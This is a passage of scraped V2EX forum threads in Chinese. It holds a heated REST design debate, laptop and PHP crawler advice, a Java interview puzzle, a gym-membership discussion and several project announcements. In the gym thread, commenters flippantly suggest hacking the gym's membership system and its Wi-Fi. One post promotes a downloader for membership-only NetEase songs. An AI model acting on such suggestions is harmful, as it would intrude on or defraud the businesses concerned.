针对支持“资源挂载位置”  概念的系统 -> 做成修改资源挂载位置的请求 。\r", "\r", "支持以上这些， RESTful 都是毫无问题的。\r", "\r", "---\r", "\r", "为什么我认为 \"用 HTTP StatusCode 相当于 返回 Either<int, Error>\", 我的理由是：\r", "\r", "1. 对所有的使用者来说,结果的理解方式是唯一的，要么 match(int), 要么 match(Error)\r", "\r", "2. 对所有获得 HTTP Response 的使用者来说，要么 match 到他关心的 HTTP Status Code ，例如 2XX, 3XX, 4XX\r", "要么 match 到它可能不关心的 match(Error)  ，于是处理这个错误时可以不用管 Error 具体是什么（具体错误内容在 Http Response Body 里面，通常是 Json ），这些通常是非业务相关的中间设备，例如缓存服务器， HTTP 网关之类的；\r", "也可以是业务相关的设备，这些设备可以进一步处理 Error 的解析（也就是解析 Response Body 里面的 Json ）\r", "\r", "\r", "为什么我认为 只使用 GET POST ，相当于返回 int ，\r", "\r", "就如同我本帖一开始说的那样，相当于要求所有参与调用这个 API 的人知道， int 的含义并不是简单地一个数值，而是在某个数值范围内才是正常的结果，在某个数值范围内是表示错误。\r", "\r", "只使用 GET POST ，\r", "如果不是一直使用 200 ，那么就有混淆资源相关错误和 API 错误的问题；\r", "如果一直只使用 200 ，那么就强迫所有使用者必须了解业务细节才能理解 HTTP Response ，对有 HTTP 中间非业务相关的设备来说，肯定是不友好的。\r", "\r", "当然，很多系统没有大到拥有非业务相关的 中间 HTTP 设备。\r", "\r", "所以对于这种系统，这是一种传统约定的偷懒行为，能 work ，但并不是什么好的设计。\r", "这样的系统一旦扩展，需要添加业务不相关的 网关、缓存之类的设施之后，就会因为 API 设计的偷懒 而 要复出 重构的代价。", "\r", "1. 相反，如果不一直使用 200 ，才会导致 API 自身错误和资源相关错误。此时如返回一个非 200 的 HTTP 状态码，调用者会无法判断这个错误是否经过了 API 的业务逻辑才返回的。所以我的做法是经过了业务逻辑才返回的错误放在返回的 json 中而不是 HTTP 状态码——这就是为什么我认为<int, Error> GetNumber() 是类似于返回 json 来描述错误。\r", "\r", "2. 不把位置视为资源的扩展属性，则资源的逻辑位置和物理位置可以用一套自然的对应法则进行对应。否则，你必须手动实现物理位置和逻辑位置的非自然的对应关系——通常得把它写进数据库，资源被访问时去查询。", " \r", "\r", "1.  “调用者会无法判断这个错误是否经过了 API 的业务逻辑才返回的”\r", "\r", "很明显这是因为没有正确地使用 HTTP Header 。\r", "调用者只需要分析一下 Content-type 和 Server 头就知道是否经过 API 的业务逻辑。\r", "\r", "但说实话，作为 API 调用者的 HTTP Client ，知道是否经过 API 调用这真的重要吗？\r", "这是否意味着调用者与 API 服务之间的过度耦合？\r", "如果确实未经过 API 服务就得到了 HTTP 回复难道调用者就不需要处理了吗？\r", "\r", "所以这是一个因为错误的做法而产生的伪问题。\r", "错误的根本原因就在于对 HTTP 的能力了解不足，才会说只要 200 和 GET POST 就够了。\r", "\r", "2. 什么叫做“自然的对应法则”？\r", "\r", "我不觉得你说的“自然的对应法则” 不适用 “存储位置” 和 “挂载位置” 两种概念中的一种。\r", "\r", "你能够 “不把位置视为资源的扩展属性” 那纯粹是业务不需要。\r", "\r", "拿 “邮件”作为资源的具体例子，对应“发送”“归档”“删除”“移动”。\r", "\r", "你解释一下你的所谓 “自然法则”是什么。\r", "反正我是觉得肯定跑不开 “存储位置” 和 “挂载位置” 这两种。\r", "\r", "“存储位置”：邮件数据在物理存储中的位置，无外乎 数据库中，文件系统中\r", "“挂载位置”：邮件属于哪个逻辑存储位置，例如某某用户的某某文件夹下，某某分类或者聚合的某某路径下。\r", "\r", "你乐意的话，讲讲你的 GET POST 怎么完成上面的业务概念。\r", "\r", "我已经证明过 RESTful 无论应对哪种需求的展开都有完美的办法。", " \r", "\r", "1. 不需要，由于单个动作所具有的原子性，遇到未经过业务逻辑的响应直接丢弃并停止即可。\r", "\r", "2. 我说的自然对应法则指的是无例外的、一一对应的法则。\r", "如果只移动逻辑位置而不移动物理位置，必定会造成法则中存在例外情况，而例外情况的存储、查询又要单独处理。\r", "如果直接移动物理位置，就不会在一套对应法则中存在例外。", " \r", "\r", "1. 不说逻辑处理的细节都是在扯淡。如果业务协议都是 GET POST 200 ，要怎么写代码才能知道是未经业务逻辑响应？\r", "难道不需要尝试解析一下报文吗。\r", "一句话轻轻带过，你也就是用用框架写写业务代码的水平。\r", "讨论 REST 太为难你了。\r", "\r", "2. 不说人话，我也不想和你讨论了。\r", "请你离开此贴。", " \r", "1. 难不成用 REST 就不需要解析？不用 rest 我可以判断完 status code 直接走解析流程，数据都是预定义的、结构化的。用 REST 除了区分 status code ，还要搞一堆你说的乱七八糟的东西，完全是多此一举。\r", "我不仅写后端的业务，我还同时要写前端的。在什么场景下的前后端之间怎么进行数据的交互最方便，恐怕只写后端的人是没有这方面的实践的。\r", "和你讨论 REST 相当为难我，因为我确是在和一个凡事必 REST 而不考虑实际情况的人谈。\r", "\r", "2. 你可以选择 Block ，我倍感荣幸。", " \r", "\r", "1. 请你先搞清楚，我说的 “报文”不包括 HTTP 头。 \r", "\r", "GET POST 200 status code 就是得必须解析报文。 正确使用 HTTP STATUS code 例如 REST 的做法，就肯定可以不解析报文。\r", "\r", "写过前后端，也就是搞搞 界面搞搞 业务协议的程度吧，这一点都没有改变你对 HTTP 的无知。\r", "写过 怎么从 stream 开始解析 HTTP 请求的代码吗？\r", "如果你真的写过就知道你们这些所谓的 200 党是多么弱智。\r", "\r", "你倒是说说什么 HTTP 上的应用 REST 是解决不了的啊，光喊靠这种那种卑鄙暗示对手愚蠢，有用吗？\r", "承认自己经验少不就可以了嘛，非得死撑。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>为了熟悉 GitHub API 而写的一个小玩具： <a href=\"https://github.com/benjycui/open-source-hero\" rel=\"nofollow\">https://github.com/benjycui/open-source-hero</a></p>\n<pre><code>$ open-source-hero benjycui\nbenjycui had contributed to 47 repositories.\n1. ant-design/ant-design\n2. react-component/calendar\n3. benjycui/open-source-hero\n4. ant-design/bisheng-plugin-antd\n5. benjycui/bisheng\n...\n</code></pre>\n<p>其实这个东西并不精确，但是就玩具而言，还可以吧。</p>\n</div></div>"], "reply": "4", "tittle": "写了个可以计算某一用户在 GitHub 上面贡献了多少个项目的玩具", "comment": ["试了一下，我自己名字和自己组织的没收集全，倒是收集到了一堆别人 clone 我项目 / 我贡献过的项目后直接 remote add 传到 GitHub 的项目……我竟然还看到了在 OSChina 上我给 DiscuzX 提交的代码……", " #1 原来原理是 GitHub Search 啊，这锅得给 GitHub 背", "![]( ", ")    node 7 only........", "github api 吗"]},
{"content": ["<div class=\"topic_content\">后面一段时间会写.NET ，然后也可能会写 Java 或者 Android 。\r<br>一直在 xps 和 Mac 之间徘徊，但是不太肯定哪款可靠。另外，如果推荐 xps 的话，是 xps13 呢，还是 xps15 呢？\r<br>谢谢。</div>"], "reply": "135", "tittle": "程序猿用什么笔记本比较好？", "comment": [" \r", "two fingers jump:\r", "\r", "\r", "coil whine:\r", "\r", " 还可以插入视频的。 6666666", "矫情，选个自己喜欢的就行了，都能写。", " 日常够用了，还能最低特效打打游戏。。。", "用毛笔记本，那么小的屏幕，用了就会视力下降。我买了一个骷髅峡谷上下班带着。电源另买一个放公司~", " 老哥 666 关键开机关机 打开各种 ide 好烦啊", " 你是真皮", " 开关机+打开 ide 总共花费时间不会超过 5 分钟吧~ 一天之内", "用 Mac 吧，等你以后准备找女朋友就知道好处了。", " 跟找女朋友有什么关系。。。", "MACBOOK PRO 15 inch", " 在大部分女生面前，什么 XPS ，外星人，地球玩家就是一堆 X ， MAC 才是高大上。", "我现在入门级的 thinkpad ，内存加到 24g ， 硬盘 500g ，主系统 win10, 跑了个虚拟机 unubtu 给他分了 8g 内存，开了两个 virtual desktop ，切换很方便", "虚拟桌面是 win10 下的，定义成四个手指左右滑动来切换， ubuntu 常年全屏", "不是 mac 都可以", " 我用了两年 Mac 了，也没见包分配女朋友", "iv2er ", " ", "mac", " 使用 mac 的姿势不对", " 然而 ThinkPad 更有意思", "准备这三个里面选一个\r", "\r", "  \r", "如果不打算外接显示器的话，一定要买 17 寸屏。。。\r", "14 寸的 1920*1080 简直要瞎啊。。。\r", " ", " ", "Dell Precision M4800 也不错", " 壁纸不错", "人家开发.NET ……给人推荐 MBP 是什么心理……", " 爱笑的人运气通常不会太差", "烧烤煎炸蛇（灵刃）", "I recommend Thinkpad T440", "喜欢 thinkpad", " 抓到野生妹子一名，单身的赶紧过来帮忙，快压不住了！！！\r", "\r", "PS ：妹子你的 ", " 好像挂了， ", " 666 才知道 想入手 太炫酷了", " 不会缩放？ 13 英寸 3k 分辨率也没瞎", "家里用 Intel Core i7-6700 16GB 内存：\r", "\r", "\r", "\r", "\r", "\r", "办公室用  Intel Core i5-7300HQ  8GB 内存：\r", "\r", "\r", "当然是 thinkpad t460\r", "什么？你要选 mbp ？\r", "呵呵呵呵", " @", " @", " @", " x1c 够用吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>接到一个任务要我写一个爬虫!可是我暂时只会 php,但是 php 写爬虫不是强项!v 友有用 php 写过爬虫的吗?有个开源项目推荐借鉴参考一下!或者说我现在去学习 python 星期五能完成好一个爬虫吗!爬出来的数据要写进数据储存的!谢谢了</p>\n</div></div>"], "reply": "35", "tittle": "PHP 写一个爬虫(v 友注意详细看正文详情)", "comment": ["有偿提供 python 爬虫解决方案", "gouchaoer  同学的爬虫经验分享： ", "\r", "\r", "另外可以看下这个： ", "  确实不是强项，单线程爬的", "假设你 php 基本功 已经会数据库了 也会发出 get, post 请求 获取 response\r", "那么你离 爬虫只差了一个 正则的距离", "任何语言只要能发网络请求都可以写爬虫。\r", "python 爬虫通常是用增强库，用来帮助解析网页数据。\r", "php 写爬虫通常是用 curl 库+re 正则解析，可以借助 curl 的库做很多参数设置， header cookie 之类的。抽取数据是靠正则来做解析。需要自己写任务管理。\r", "如果爬虫是强嵌入原有业务的，比如需要取很多业务数据做检测，那就用 php 继续写爬虫，封装一个 curl 的处理接口，然后写一个多进程任务管理，要用到命令行的库，通常要借助 mysql 、 redis 之类的做进程间数据同步。\r", "\r", "如果仅仅只是为了一次性抓取数据， python 上手也很快，一周绰绰有余。", "别正则\r", " 大神,python 基本语法会啊!周五交能赶上吗? 今天周三了", "火车采集", "一直用 php 爬，按功能分开写(目标网址预处理，抓取，分析....)，用队列。多开几个抓取进程同样可以跑满带宽。", "前提是你要爬什么？目标网站限制爬虫吗？如何限制\r", "\r", "BTW ， PHP 写爬虫效率不比 python 差\r", "\r", "有偿提供 PHP 爬虫方案 XD", "jquery 会吧。用这个库，分分钟教你做人。 ", "你需要的可能是火车头采集器", "同 2 楼， phpspider", " 有博客嘛", " 有偿是多少钱", "同有偿，二楼优先😁\r", "价格看复杂程度，平价接单", "分两步，第一步抓取： Snoopy.class.php\r", "第二步解析内容： Simple Html Dom\r", "\r", "两个关键词直接百度就可以把工具类拿来用了，挺简单的。", "简单的就是 curl 获取页面内容，然后就是写正则提取需要的数据了。\r", "\r", "之前某论坛要关闭，我是花了 2 个夜晚写了 PHP 抓取程序把那个论坛的数据都抓下来了并入库。因为单进程抓取速度太慢，又写了个多进程页面管理，前端页面能实时查看各个进程的抓取速度，开新进程或者结束指定进程等等。\r", "curl 获取页面， redis 做队列， access 做数据库（喜欢单个文件数据库，小巧方便带走）", "这帮人，每人推荐个靠谱的。。", "我来推荐个靠谱简单的  ", "任何语言的爬虫的实践都差不多吧。 http get/post + 分析 request header +DOM selector/XPath/正则(这是基础的 \r", "再上去就是集成啥 headless  browser /proxypool/分布式调度啥的了", "我现在也是 PHP 写爬虫 还行 在 PHPQUERY 解析", "同有偿 楼上的都优先", " 能不用 redis 吗?", "我记得有个库叫 PHPQUERY\r", "很好用，类似 jQuery 一样直接用选择器就好\r", "不过 PHP 的多线程……", "有偿约炮", "楼主能帮忙给我爬几个用户 ID 吗？", " 我用 redis 作用是做队列，先把要抓取的页面 ID 全部 push 进去，然后抓取页面就从 redis 里 pop 一个页面 ID 出来去抓取，所以多运行几个 php 页面就能提升抓取速度，相当于多进程模仿多线程。本来是不用 redis 的，因为 access 并发读取修改的问题，用文件锁都锁不住。", " PHP 写爬虫感觉没比 shell 方便多少", "不采集 https 的话 其实 dedecms 就行啊", "guzzle + domcrawler", " 我个人感觉是，如果原来的业务用什么语言，需要抓取数据的时候，就看是不是特别嵌入原来的业务，需要特别频繁调用原有数据做检测的，那就用原来项目的语言，可以很方便的复用原有项目的代码做检测和插入数据。\r", "\r", "爬虫这类的业务可大可小，用什么脚本语言写，性能都不会有特别明显的差距，主要还是看工程规范，用什么语言写全看团队成员的技术栈。\r", "\r", "我个人比较喜欢 curl 库+v8 库+正则的方案。 curl 库解决 header cookies https 的各种问题， v8 解决某些 js 加密的问题。正则解决抽取数据的问题。 CPU 和内存消耗都比较低。\r", "\r", "然而实际上如果只考虑一个语言的话， nodejs 解决所有问题。", "看看这个 PHPSpider ： ", "看看这篇文章，分分钟搞定一个爬虫程序 ", "周五， py ，来得及"]},
{"content": ["<div class=\"topic_content\">问题是这样的\r<br>\r<br>某页面 url: /test/123   (这里 123 是资源 id)\r<br>\r<br>我想通过 url 访问这些资源\r<br>\r<br>但是希望通过 js 异步加载，而不是在服务器渲染页面\r<br>\r<br>请问这种事情应该怎么处理比较好？</div>"], "reply": "4", "tittle": "有这么一个奇怪的前端问题", "comment": ["前端框架自己做路由，比如这种链接 example.com/#/user/2\r", "vue.js 里的 vue-router 可以办到这个效果，别的框架也有一样效果的东西", "使用 header 来区别 ajax 还是普通页面访问\r", "Accept: application/json", "如果不想用框架，可以试试这个轻量的前端路由\r", " thank you ，这个应该可以很好的解决！"]},
{"content": ["<div class=\"topic_content\">int num = 0;\r<br>\t\tfor(int i=0;i&lt;10;i++)\r<br>\t\t\tnum = num++;\r<br>\t\tSystem.out.println(num);\r<br> - -我居然答错了  我记得数值在++赋值的时候 数字也会自增啊</div>"], "reply": "4", "tittle": "面试的时候遇到的一道题 v 友帮忙看看输出多少", "comment": ["底层实现的方法：\r", " 谢谢！", "为什么会考这种东西，一般来说 code style 都会配置为禁止 inline assigment", "其实项目有这样写的代码，我肯定要他重写的。哈哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>萌新的亲身经历，求各位大佬的预防针，防止下次再遇到。</p>\n</div></div>"], "reply": "12", "tittle": "如何应对以破坏代码为由不付工资的情况？", "comment": ["劳动局仲裁啊！他们没有权利拒付，也没有权利罚款", " 谢。本来实习工资不多，不想浪费时间和精力去较真。\r", "\r", "只是想请教如何从源头上预防这种手段。", "r#2 @", " 积极维护自身权益也算是浪费时间了？\r", " ", "  把公司爆出来，大家帮它做 SEO", " 666", " +1", "“破坏代码” 指的是？", " 想把精力投入到找下一个工作上...话说 V2 还支持表情啊...\r", "\r", "\r", " 对方含糊其辞，想必是一种借口。", " \r", " \r", "你们这收录的都是大厂的，但是还是有很多程序员是在小厂，别说去不去大厂的问题，而是人家大厂要不要的问题", "预防只有一条路\r", "\r", "法治之路。", "如果真的破坏了的话就不是扣工资这点小事了", "什么叫破坏代码啊。。。我也是醉了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目要求按照合同模板生成合同，准备采用 freemarker （将 word 模板另存为 xml 并采用 freemarker 标签标记） + 数据的方式生成 word 文档。数据来源于多个业务系统，准备将模板所需数据存储在表中。</p>\n<ul>\n<li>因为合同模板会变化，所以数据也要跟着变化，按照版本的方式对以往的生成模板进行兼容。</li>\n<li>合同模板的版本比较好处理，按照上传进行版本标记管理，但是对于数据，如何更好的进行版本管理，难道要每次创建一个新的数据表？</li>\n</ul>\n<p>以上方案，大家有没有更好的处理方式， V2 大神多，望指教，感谢！</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "关于数据版本的处理，大家给点意见", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在学习算法，遇到一个求集合子集问题，看到有用二进制左移之后进行&amp;操作的实现方式，但自己想用减治法递归的方式实现一下，问题是不知道如何保存，分解为子问题的集合返回的集合，如果用 C++， java 写应该会好写点，但我就想用 C 语言写，不知各位大神有和方法。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\">&lt;image src=\"&amp;lt;a href=\" https:=\"\" &lt;a=\"\" href=\"http://img3.doubanio.com\" rel=\"nofollow\"&gt;img3.doubanio.com=\"\" view=\"\" photo=\"\" thumb=\"\" public=\"\" p2447056594.webp\"=\"\" rel=\"nofollow\"&gt;<a href=\"https://img3.doubanio.com/view/photo/thumb/public/p2447056594.webp\" rel=\"nofollow\">https://img3.doubanio.com/view/photo/thumb/public/p2447056594.webp</a>\"&gt;\n</div></div>"], "reply": "1", "tittle": "减治法求集合幂集（即子集）问题？", "comment": ["从你的描述无法猜出你想描述的问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1.RT ；</p>\n<p>2.15 节课， 2200 左右， 135 上课，时间可自选；</p>\n<p>3.每天大家有多少运动量，是去健身房还是？</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><ol>\n<li>\n<p>已经打算办，就当为信仰充值</p>\n</li>\n<li>\n<p>吃灰应该不至于，现在是每天夜跑6公里+</p>\n</li>\n<li>\n<p>感谢各位老司机的建议，撩妹这个事，得先健身好（不一定看脸把23333）</p>\n</li>\n</ol>\n</div></div>"], "reply": "78", "tittle": "公司楼下开了个健身房，身为程序员要不要趁这个机会去。。。", "comment": ["楼主在哪个城市呢，去健身房至少一周三练，一次 1-2 小时，达不到这个频率不建议办。", "下意识：\r", "要不要趁这个机会去给他们做个 APP", "练总比不练好，建议去。", "还要下楼，有点远", "2200.。。。握草真黑\r", "\r", "还是只办卡别学课程， keep 自己摸索入门足够了。", "上班时间有没有时间去呢？我们楼下也有一个，每天早上 10 点才开，下午下班时里面挤爆了。\r", "\r", "如果早上开得早，或许可以早点起床练完上班，不然就是午休时间。", "先看看健身房里妹子多不多 质量好不好 不然几天就没动力了", "我没请私教，练得风生水起", "商业健身房的私教水平鱼龙混杂，我见过些自己练的还不错，但带会员时动作带的不标准，譬如翻轮胎的龟背。\r", "\r", "我觉得健身主要看诉求，要只是想提高下运动量健康点，跑跑步就足够了；健美塑性的话，肯定要请私教，当然这里是指水平不错的私教，并且自己也需要花时间学习；力量系的话，一般商业健身房的私教就算了，倒是学校健身房会有些练的还不错的，或者就多掏钱去 CrossFit 馆团体练。", "如果我公司楼下有 24 小时的健身房，我天天会去撸", "健身房都信仰充值，。。", "练好肌肉勾引男子还是勾引女子？ QAQ", "去吧，人生迟早要为永远都不会再去的健身房买一次单。", "我上班的时候每天放弃中午吃饭的时间坐公交车都要去…坚持了两年了，目前感觉良好。\r", "\r", "开在楼下的健身房这等福利不是每家公司都有的。", " 666", "北京这边一节课 300 ～ 500 啊，你这个好便宜了已经。", " 搜一下“乐刻”", "不要上课，办张卡就好了。", "骑车上下班就行了，自古健身房就是靠买了不去的人来盈利的。", "人贵有自知之明", "我把话说到放这里：“你！的！会！员！卡！一！定！会！老！老！实！实！吃！一！年！灰！”\r", "\r", "不信一年后回来挖坟！", "去吧 约会的好地方", "建议不要找私教，自己办卡自己练，找人带你熟悉一下器材，教一下动作就 ok 了", "入侵会员系统吧", "你如果只是为了运动，那不需要教练，不需要上课，选几个有氧运动，什么跑步机，椭圆机玩玩就可以了。你要是坚持的下去，多花钱都是值的，就怕坚持不下去，最后就是浪费钱\r", "我很早就发现自己肯定坚持不了，所以选择了羽毛球这种趣味性技术性很强的活动，现在一周一次", "趁这个机会问问他们要不要做会员系统，考勤系统等等。。。 2333333", "百度搜索 腹肌撕裂者 就好 跟着做", "据说健身工作室质量比较高", "商业的健身房水深", "如果你有时间并且愿意上 youtube, ", " 上研究健身动作以及知识的话不用请私教", "公司不给健身房福利么\r", "不给跳槽", "没见过学费，怎么算上过学呢？", "还以为要去泡妞", "不贵，可以去，我办了年卡，又买了课， 200 一节。现在感觉很不错。  健身房妹子也很多，身材也不错", "我觉得去健身房健身靠谱啊，但是还得分两步\r", "1. 去健身房\r", "2. 在健身房健身\r", "\r", "实践证明，第一步真的不容易", " 15 节课 2200 真不算黑吧...", "我这边健身房跑掉了好几家。(∴◎∀◎∴)", "你们的课真便宜，我们这边私教课 300 一节，才买了 12 节。。。", " 一看就是同道中人，是不是 android 猿， 233333", "公司楼下有的话，挺方便的，如果不经常加班的话，建议你去办一个。\r", "的有毅力坚持下来。", "每天骑摩拜 10 公里", " 66666 需要写后端的话可以外包给我", "7x24 开放的健身房，公司附近 2km 有 3 家，只要 99 一个月，不限次数，不限时间——还能盈利开分店。\r", "哦对了，他们已经有 APP 了， 用 APP 刷卡开门进去的。", " 成就达成...", "健身怎么都好. 而且健身有瘾.哪怕每星期练一次.也比不练强很多.\r", "买私教课的好处是在你坚持不下来的时候想想还交了那么多钱没练完 你就会坚持去.\r", "当你上完了十几节私教课你的体能各方面也会提升很多 重要的是身体素质 降低猝死概率 你懂吧.\r", "我觉得如果你是正常体形的话一般上个 30 节左右的课自己有体力就可以自己练了不需要教练了.", "公司有健身房的路过，虽然位置不多", "就没人聊聊去健身房勾搭妹子吗", "看到标题，第一反应是“身为程序员要不要趁这个机会去。。。 勾搭妹子”", "坚持住 希望别吃灰··· (￣▽￣\")", "一身肌肉还不如看脸", " 好便宜咯", "这边 1000 多一年。。没人教而已，随便用器材", "办张吧，每天去洗个澡也划算。现在都是每天晚上下班到家 keep 一小时", " \r", "此言差矣，不规律的锻炼，不如不练", " 帝都， 135 连，每次一个半小时。\r", " 程序员你好。。。\r", " 是个理，现在晚上跑步， 6 公里+\r", " 按这个道理都不能吃饭了，还得下嘴 23333\r", " 人家说这是刚开班，算便宜的\r", " 这个算小班制把，人多了他们那根本放不下。\r", " 还没开张 2333\r", " 666\r", " 像 steam 一样，买了从来不玩吗\r", " 大哥你想多了，勾引妹子就好\r", " 或许我可以感受下健身房，还没去过，现在是夜跑\r", " 有道理\r", " 23333\r", " 是的啊，说明这个老板有远见，附近好多办公楼\r", " 就是北京....\r", " 这样还不如去吃海底捞\r", " 马上就是柳絮飞飘的时间，然后就是夏天，骑车现在还凑合。\r", " 23333\r", " 大哥你肯定要失望。。\r", " 2333\r", " 现在就是都不熟悉，没有看到老司机在那。。。\r", " 人家宣传单都没印，哪来会员系统，现在都没对外，估计还得两天！\r", " 666 ，没有跑步机，人家说了不是只让你拉拉筋\r", " 这样好吗\r", " 靠谱吗\r", " 看着有点懵\r", " 感谢提供资源\r", " 虽然有，但是没去过（不是对所有人开放，你懂）\r", " 交学费。。。\r", " 这是附带条件\r", " 是啊，这个分阶段，感觉都是套路\r", " 难道不是第二步不容易吗，去了是去撩妹了。。。\r", " 擦，还有跑路的吗\r", " 欢迎入坑 \r", " 最近还好不是很忙\r", " 会累成 dog\r", " 666\r", " 现在属于不胖类型，应该一个月差不多练出来\r", " 23333\r", " 可以先健身在去撩妹\r", " 勾搭。。。\r", " 会的", " 厉害了，我的哥\r", " 这，还不如夜跑\r", " 这洗澡水有点贵。。。", "我操真便宜，我买了 12 节课 4000.。。。", " #55 此楼充分的让我感觉到这是个骗铜币的帖 233333", "公司在楼下有个健身房的飘过\r", "\r", "果断练啊。把妹是其次，身材带来的自信才是根本", "上次谁说的，健身房跑路了。。。", "去練，但不請私教", " 那就入侵 wifi 呗，然后就可以监控局域网，进一步知道最低价，折扣，然后你可以去应聘兼职当私人教练，这样又能免费锻炼，又能赚钱，还能看姑娘。", "练比不练好 重在坚持", "一般去健身房的妹子，尤其那些敢在器材区练，而不是简单的踩踩单车跑步机上跑跑的妹子。对于还在犹豫“健身房去还是不去”的男生是没有兴趣的。", " 我就喜欢那样的妹子", "如果是因为公司楼下开了健身房 才考虑。。。\r", "我相信这卡办完 很大概率就是吃灰的\r", "\r", "如果坚定的把健身这事 当成与工作一样重要 或生活中的必须部分，这还犹豫啥", " 真贵。。。\r", " 23333\r", " 是这个道理\r", " 刚开张总不至于跑路把\r", " 为何？\r", " 伟大的目标\r", " en\r", " 哭瞎\r", " 0.0", "15 节课 2200 不算贵吧...", " ", "还要下楼啊，有点远，还是不要了吧", " 0.0\r", " 2333", "过多两个星期，楼主在二手交易区出售健身房会员。", "单位楼里有个小健身房，我一周五练，每次 1-1.5 小时\r", "主要是怼铁，辅以少许的有氧\r", "\r", "坚持下来对身体的变化是可以看的到的", "结果是弯了", " 我去健身房都是找那些大隻佬多聊多問的，哪些器械不會去問問就會用了。去的也多，效果也算比較顯著。當初確實擔憂過自己練會不會比起請教練來說走很多彎路，現在想想看來是想多了。\r", "\r", "當然你有資金充裕的情況下，請教練也不失為一個好的選擇。但是你要做好被教練各種 hard sell 的準備。", "15 节课 2200 不贵，但是你得看看教练资格怎么样，有没有拿到什么认证。现在均价 300 - 400 吧", " 我已经去了半年了", " 感觉你这练得有点猛啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1><a href=\"https://github.com/ZevenFang/react-meteor-todomvc\" rel=\"nofollow\">react-meteor-todomvc</a></h1>\n<p>使用 <a href=\"https://github.com/ZevenFang/react-meteor\" rel=\"nofollow\">react-web-meteor</a> 和 Meteor 用户系统构建实时的 Todomvc 。</p>\n<h2>Preview</h2>\n<p><img alt=\"preview\" src=\"https://raw.github.com/ZevenFang/dva-react-meteor-todo/master/screenshot/preview.gif\"></p>\n<h2>Getting started</h2>\n<p>请确保已经安装 <a href=\"https://www.meteor.com/install\" rel=\"nofollow\">meteor</a>.</p>\n<pre><code>cd server &amp;&amp; meteor\ncd client &amp;&amp; npm start\n</code></pre>\n</div></div>"], "reply": "目前尚无回", "tittle": "不一样的 Todomvc，使用 React、Meteor 构建实时 Web 应用", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目地址=&gt;<a href=\"https://github.com/ziwenxie/netease-dl\" rel=\"nofollow\">https://github.com/ziwenxie/netease-dl</a></p>\n<p>netease-dl 是一个基于命令行的网易云音乐下载器，可用于下载某些必须要会员才能下载的歌曲。支持多种下载功能：</p>\n<ol>\n<li>下载单首歌曲</li>\n<li>下载一个歌手的前 50 首热门歌曲</li>\n<li>下载一张唱片的全部歌曲</li>\n<li>下载私人收藏和创建歌单内的全部歌曲</li>\n<li>单独下载一张歌单的所有歌曲</li>\n<li>下载指定用户公开的歌单</li>\n</ol>\n<p>具体的使用教程都可以在<a href=\"https://github.com/ziwenxie/netease-dl\" rel=\"nofollow\">GitHub</a>上面看到。如果有任何的疑问或者需要新增功能，欢迎留言:)</p>\n</div></div>"], "reply": "3", "tittle": "写了个基于命令行的网易云音乐下载器", "comment": ["试一试", "win7 python3.5 安装失败\r", "\r", "    Skipping optional fixer: buffer\r", "    Skipping optional fixer: idioms\r", "    Skipping optional fixer: set_literal\r", "    Skipping optional fixer: ws_comma\r", "    running build_ext\r", "    warning: GMP or MPIR library not found; Not building Crypto.PublicKey._fastm\r", "ath.\r", "    building 'Crypto.Random.OSRNG.winrandom' extension\r", "    error: Unable to find vcvarsall.bat", " 现在还没有在 Windows 平台下面测试过π__π"]},
{"content": "", "reply": "17", "tittle": "有哪些牛人或者学霸通过自己的软件赚了很多（让自己衣食无忧）的钱？", "comment": ["flappy bird 作者", "马化腾", "多了去了 自己查", "求伯君，写的 WPS", "张小龙算一个吧 foxmail wechat...", "Livid Torvalds", "扎克伯格", "记得那个 windows phone 的作者 之前也来讲过 月入上万刀", "Minecraft  Markus Alexej Persson", "我自己用 python 写了一个股票自动高频交易程序，每天躺着收钱", "Minecraft 开发者？", " 没有回撤的时候？", "雷军，", "Textmate 和 Dash 都是经典的案例", " 怎么做的？", " 基本很少回撤，但也不敢下大的资金", "一般来说技术好的，产品思维都一般；产品思维好的，技术能力一般。像你说的技术好的，产品思维也好的，少！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>明明是 2k 的文件，<br>\nhexo g 到 public 文件夹后文件变成 1k 了。<br>\n导致网页显示不正确了<br>\n希望知道的大神帮忙解答一下</p>\n</div></div>"], "reply": "2", "tittle": "hexo g 之后，文件少了东西", "comment": ["原来是 example.md \r", "现在是 example.html", " 编译后的 vue 文件。 html 没有问题，就是 js 文件  \r", "例如 manifest.***.js 原本是 2k 大小的。  \r", "hexo g 之后在 public 中变成了 1k,  \r", "然后网页也不能正确显示了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>主要功能如下：</p>\n<ul>\n<li>支持大文件上传（需要开启表单 API ）和图片到又拍云服务器（图片、其他附件等）</li>\n<li>支持 HTTPS</li>\n<li>支持同步删除</li>\n<li>增加图片编辑功能</li>\n<li>优化防盗链功能</li>\n<li>增加与水印插件的兼容性等</li>\n</ul>\n<p>安装方法详见： <a href=\"http://support.upyun.com/hc/kb/article/1025121/\" rel=\"nofollow\">http://support.upyun.com/hc/kb/article/1025121/</a></p>\n</div></div>"], "reply": "9", "tittle": "插件推荐|WordPress 远程附件上传插件", "comment": ["插件推荐，有需要的可以看下~", "此插件哪里都好，就是 REST 远程路径和 HTTP 路径设置那里没有处理好，前后要不要加 /  没有讲清楚，加了或不加都有问题。", " 感谢，收下意见啦~", "插件不错……", "谢谢分享。", "方便了好多，赞的", "现在都流行小号自顶的?  lz 懂我的意思吧", " 你这么一说才发现。。 666", " 6666 我也才刚发现"]},
